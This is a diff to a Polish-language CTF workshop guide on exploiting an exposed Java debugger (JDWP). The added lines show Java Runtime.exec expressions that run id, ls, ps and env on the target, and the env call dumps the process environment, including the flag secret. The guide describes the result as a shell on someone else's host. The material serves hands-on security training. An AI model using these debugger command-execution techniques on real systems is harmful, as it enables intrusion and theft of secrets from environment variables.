@@ -34,7 +34,7 @@ w `add()` pokaże to od razu.
 </details>
 
 ## Etap 2 — ukradnij sekret (CTF)
-Jesteś już wpięty w proces. Serwer chowa flagę i przez HTTP pokazuje tylko `FLAG{****}`
+Jesteś już wpięty w proces. Serwer chowa flagę i przez HTTP pokazuje tylko `FLAG-****`
 — ale debugger widzi więcej. Dwie drogi:
 
 **A — odczyt pamięci:** zatrzymaj wykonanie (np. breakpoint w obsłudze żądania, potem
@@ -50,9 +50,31 @@ new java.io.BufferedReader(new java.io.InputStreamReader(
     Runtime.getRuntime().exec(new String[]{"id"}).getInputStream())).readLine()
 ```
 
+`readLine()` zwraca tylko pierwszą linię. Dla poleceń z wieloma liniami (`ls`, `ps`)
+wygodniej przeczytać cały strumień naraz — `Scanner` z delimiterem `\A` bierze go w całości:
+```java
+// ls — zawartość katalogu roboczego procesu
+new java.util.Scanner(Runtime.getRuntime()
+    .exec(new String[]{"ls","-la","/opt/app"}).getInputStream())
+    .useDelimiter("\\A").next()
+
+// ps — procesy w kontenerze (PID 1 to java -jar ctf.jar; flagi JDWP siedzą
+//      w JAVA_TOOL_OPTIONS, więc tu ich nie widać — pokaże je env poniżej)
+new java.util.Scanner(Runtime.getRuntime()
+    .exec(new String[]{"ps","-ef"}).getInputStream())
+    .useDelimiter("\\A").next()
+
+// env — pełne środowisko procesu, w tym WORKSHOP_FLAG
+new java.util.Scanner(Runtime.getRuntime()
+    .exec(new String[]{"env"}).getInputStream())
+    .useDelimiter("\\A").next()
+```
+Dowolne polecenie podstawisz w tablicy `String[]`. To już zwykła powłoka na cudzym
+hoście — stąd „dowolny kod" w nazwie sekcji.
+
 Weryfikacja flagi:
 ```bash
-curl "http://ADRES:80xx/verify?flag=FLAG{...twoja...}"   # ✅ / ❌
+curl "http://ADRES:80xx/verify?flag=FLAG-...twoja..."   # ✅ / ❌
 ```
 
 ## Debrief (najważniejsza część)
